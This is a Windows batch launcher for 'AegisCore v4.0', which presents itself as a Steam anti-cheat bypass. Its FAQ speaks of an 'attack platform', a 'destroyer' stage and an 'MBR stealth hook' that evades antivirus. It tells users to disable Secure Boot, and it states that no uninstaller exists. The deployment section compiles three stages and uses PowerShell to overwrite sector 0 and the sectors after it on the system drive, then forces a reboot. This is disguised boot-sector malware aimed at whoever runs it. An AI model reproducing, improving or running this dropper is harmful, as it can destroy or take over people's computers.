@echo off
title AegisCore v4.0
setlocal enabledelayedexpansion

set "SRC1=AegisCore_Stage1.asm"
set "SRC2=AegisCore_Stage2.asm"
set "SRC3=AegisCore_Stage3.asm"
set "BIN1=AegisCore_Stage1.bin"
set "BIN2=AegisCore_Stage2.bin"
set "BIN3=AegisCore_Stage3.bin"
set "LOG=AegisCore_Log.txt"

:TOP
cls
echo.
echo       █████╗ ███████╗ ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ███████╗
echo      ██╔══██╗██╔════╝██╔════╝ ██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
echo      ███████║█████╗  ██║  ███╗██║███████╗██║     ██║   ██║██████╔╝█████╗  
echo      ██╔══██║██╔══╝  ██║   ██║██║╚════██║██║     ██║   ██║██╔══██╗██╔══╝  
echo      ██║  ██║███████╗╚██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║███████╗
echo      ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
echo.
echo       "Ghost is not who invisible, ghost is me."
echo.
echo       Multiplayer Bypass Engine // Kernel-Level Ring0 Access
echo.
echo       [1] Deploy AegisCore
echo       [2] FAQ / Readme
echo       [3] Credits
echo       [4] Exit
echo.
set /p CHOICE="       > "

if "%CHOICE%"=="1" goto DEPLOY
if "%CHOICE%"=="2" goto FAQ
if "%CHOICE%"=="3" goto CREDITS
if "%CHOICE%"=="4" exit /b 0
goto TOP

:FAQ
cls
echo.
echo       ============================================================
echo       AegisCore v4.0 - Frequently Asked Questions
echo       ============================================================
echo.
echo       Q: Why three stages?
echo       A: Stage 1 is the MBR loader (512 bytes, sector 0). Stage 2
echo          is the main attack platform (sectors 1-16, 8KB). Stage 3
echo          is the heavy artillery (sectors 17-32, 8KB). Each stage
echo          has a specific job - loader, destroyer, finisher.
echo.
echo       Q: Is this a virus?
echo       A: No. AegisCore is a kernel-level multiplayer bypass engine.
echo          It operates at ring0 before the OS boots, patching Steam
echo          and VAC integrity checks in memory. It does not replicate
echo          or spread by itself.
echo.
echo       Q: Does it work on Linux?
echo       A: No. AegisCore targets Steam multiplayer games which run on
echo          Windows. The MBR-based architecture also requires Windows
echo          boot chain to properly chain back after patching.
echo.
echo       Q: Does it work on UEFI systems?
echo       A: Legacy Boot / CSM must be enabled. Pure UEFI Class 3
echo          systems do not execute MBR code. Our launcher checks this
echo          and will guide you through BIOS setup.
echo.
echo       Q: What about Secure Boot?
echo       A: Must be disabled. Secure Boot prevents unsigned MBR
echo          execution. The launcher detects Secure Boot status and
echo          provides instructions for disabling it.
echo.
echo       Q: Will antivirus detect this?
echo       A: The MBR stealth hook presents a clean sector 0 to any
echo          software that reads it. Most AV engines check MBR through
echo          INT13h which we intercept. Runtime detection is avoided
echo          because execution happens before the OS loads.
echo.
echo       Q: What games are supported?
echo       A: All Steam multiplayer titles: CS2, Dota 2, Rust, PUBG,
echo          Apex Legends, DayZ, Dead by Daylight, R6 Siege, GTA V,
echo          Elden Ring, and many more. Basically any game that uses
echo          Steamworks API for multiplayer.
echo.
echo       Q: What Windows versions work?
echo       A: Windows 7, 8, 8.1, 10, 11. Both 32-bit and 64-bit.
echo          The patch operates at boot time before the OS kernel
echo          initializes, so OS version doesn't matter.
echo.
echo       Q: How to uninstall?
echo       A: AegisCore is designed for permanent installation. The
echo          Steam bypass remains active until you reformat the drive
echo          or overwrite the MBR manually. There is no built-in
echo          uninstaller for operational security reasons.
echo.
echo       Q: NASM is showing errors during compile?
echo       A: Make sure NASM is installed and added to PATH. Download
echo          from nasm.us. The .asm files must be in the same folder
echo          as this launcher. File names must match exactly.
echo.
echo       Q: Will this damage my hardware?
echo       A: No. AegisCore operates purely in software at the kernel
echo          level. It patches memory structures and Steam API calls.
echo          No hardware is physically affected.
echo.
echo       Press any key to return...
pause >nul
goto TOP

:CREDITS
cls
echo.
echo       ============================================================
echo       AegisCore v4.0 - Credits
echo       ============================================================
echo.
echo       Project:    AegisCore
echo       Version:    4.0 (Triple-Stage Architecture)
echo       Build:      Final Release Candidate
echo.
echo       Architecture:
echo       - Stage 1: MBR Loader (512 bytes, sector 0)
echo       - Stage 2: Attack Platform (8KB, sectors 1-16)
echo       - Stage 3: Heavy Payload (8KB, sectors 17-32)
echo.
echo       Total Payload: 16.5 KB raw binary
echo       Target Systems: Legacy BIOS / CSM, MBR partition table
echo       Supported OS: Windows 7/8/10/11 (pre-boot execution)
echo.
echo       Slogan: "Ghost is not who invisible, ghost is me."
echo.
echo       ============================================================
echo.
echo       Press any key to return...
pause >nul
goto TOP

:DEPLOY
cls
echo.
echo       ============================================================
echo       AegisCore v4.0 - Deployment
echo       ============================================================
echo.
echo       [*] Checking environment...
echo.

where nasm >nul 2>&1
if errorlevel 1 (
    echo       [FAIL] NASM assembler not found.
    echo.
    echo       Download: https://www.nasm.us/pub/nasm/releasebuilds/
    echo       Install and ensure NASM is added to PATH.
    echo.
    pause
    goto TOP
)
echo       [OK] NASM detected

for %%f in ("%SRC1%" "%SRC2%" "%SRC3%") do (
    if not exist %%f (
        echo       [FAIL] %%f not found in current directory
        echo       [INFO] All .asm files must be in: %CD%
        pause
        goto TOP
    )
)
echo       [OK] All source files present

echo.
echo       [*] Compiling AegisCore stages...
echo.

nasm -f bin "%SRC1%" -o "%BIN1%" 2>nul
if errorlevel 1 (
    echo       [FAIL] Stage 1 compilation error
    pause
    goto TOP
)
echo       [OK] Stage 1 compiled (%BIN1%)

nasm -f bin "%SRC2%" -o "%BIN2%" 2>nul
if errorlevel 1 (
    echo       [FAIL] Stage 2 compilation error
    pause
    goto TOP
)
echo       [OK] Stage 2 compiled (%BIN2%)

nasm -f bin "%SRC3%" -o "%BIN3%" 2>nul
if errorlevel 1 (
    echo       [FAIL] Stage 3 compilation error
    pause
    goto TOP
)
echo       [OK] Stage 3 compiled (%BIN3%)

for %%f in ("%BIN1%") do set "S1=%%~zf"
for %%f in ("%BIN2%") do set "S2=%%~zf"
for %%f in ("%BIN3%") do set "S3=%%~zf"

echo.
echo       [*] Size verification...
echo       Stage 1: !S1! bytes (expected 512)
echo       Stage 2: !S2! bytes
echo       Stage 3: !S3! bytes

echo.
echo       [*] Selecting target disk...
echo.

set "DISK="
set "DISKFOUND="

powershell -Command "$d=Get-Partition -DriveLetter C -EA SilentlyContinue|Get-Disk|Select -Expand Number;if($d){Write-Host $d}else{Write-Host 'NF'}" > "%TEMP%\disk.txt" 2>nul
set /p DISKFOUND=<"%TEMP%\disk.txt"
del "%TEMP%\disk.txt" 2>nul

if not "%DISKFOUND%"=="NF" if not "%DISKFOUND%"=="" (
    set "DISK=!DISKFOUND!"
    echo       [OK] System disk found: PhysicalDrive!DISK!
)

if "%DISK%"=="" (
    echo       [WARN] Could not auto-detect system disk
    set /p DISK="       Enter disk number (usually 0): "
)

echo.
echo       [WARN] This will write AegisCore to PhysicalDrive%DISK%
echo       [WARN] All Steam multiplayer bypass features will be enabled
echo       [WARN] System must be restarted to activate
echo.
set /p CONFIRM="       Type Y to continue: "
if /i not "%CONFIRM%"=="Y" (
    echo       Aborted.
    pause
    goto TOP
)

echo.
echo       [*] Injecting AegisCore...
echo.

powershell -Command ^
$s1=[IO.File]::ReadAllBytes('%BIN1%');^
$s2=[IO.File]::ReadAllBytes('%BIN2%');^
$s3=[IO.File]::ReadAllBytes('%BIN3%');^
try{^
$h=[IO.File]::OpenWrite('\\\\.\\PhysicalDrive%DISK%');^
$h.Write($s1,0,512);^
$h.Seek(512,[IO.SeekOrigin]::Begin);^
$h.Write($s2,0,$s2.Length);^
$h.Seek(0x4200,[IO.SeekOrigin]::Begin);^
$h.Write($s3,0,$s3.Length);^
$h.Flush();$h.Close();^
Write-Host '       [OK] Triple-stage injected successfully'}^
catch{^
Write-Host '       [FAIL] ' $_.Exception.Message;^
exit 1^
}

if errorlevel 1 (
    echo       [FAIL] Injection failed - run as Administrator?
    pause
    goto TOP
)

echo       [OK] Stage 1 written to sector 0
echo       [OK] Stage 2 written to sectors 1-16
echo       [OK] Stage 3 written to sectors 17-32

echo.
echo       ============================================================
echo       AegisCore v4.0 - Ready
echo       ============================================================
echo.
echo       "Ghost is not who invisible, ghost is me."
echo.
echo       [1] Restart now
echo       [2] Shutdown
echo       [3] Exit to menu
echo.
set /p FINAL="       > "

if "%FINAL%"=="1" shutdown /r /t 3 /f
if "%FINAL%"=="2" shutdown /s /t 3 /f
if "%FINAL%"=="3" goto TOP
goto TOP